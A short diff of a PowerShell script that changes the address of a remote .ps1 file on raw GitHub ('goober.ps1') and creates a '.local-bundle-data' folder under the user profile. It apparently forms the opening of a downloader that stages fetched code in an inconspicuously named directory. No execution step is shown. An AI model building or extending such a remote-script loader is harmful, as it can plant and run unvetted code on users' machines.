@@ -1,4 +1,4 @@
-$url = "https://raw.githubusercontent.com/Dannesch/test/main/code.ps1"
+$url = "https://raw.githubusercontent.com/PistiliyaTheBest/fun/main/goober.ps1"
 $directory = $Env:USERPROFILE + "\.local-bundle-data\"
 if (-not (Test-Path -Path $directory -PathType Container)){
     New-Item -Path $directory -ItemType Directory
